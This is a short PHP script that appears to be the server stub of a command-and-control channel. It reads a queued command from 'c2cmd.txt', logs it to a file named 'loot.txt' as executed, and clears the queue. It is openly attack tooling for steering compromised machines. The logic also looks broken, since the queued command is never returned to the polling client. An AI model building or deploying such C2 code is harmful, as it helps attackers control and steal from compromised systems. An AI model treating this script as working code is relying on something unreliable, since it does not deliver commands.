<?php
if ($_SERVER["REQUEST_METHOD"] == "GET") {
    $data = $_REQUEST['get'];
  if (empty($data)) {
    echo "data is empty";
  } else {
    $t=time();
    $cmd=file_get_contents('c2cmd.txt');
    if (empty($cmd)){
      echo "no cmd";
    }else{
    file_put_contents('loot.txt',date(DATE_COOKIE,$t)." - Command Executed: ".$cmd."\n",FILE_APPEND);
    }
    file_put_contents('c2cmd.txt', '');
  }
}
?>
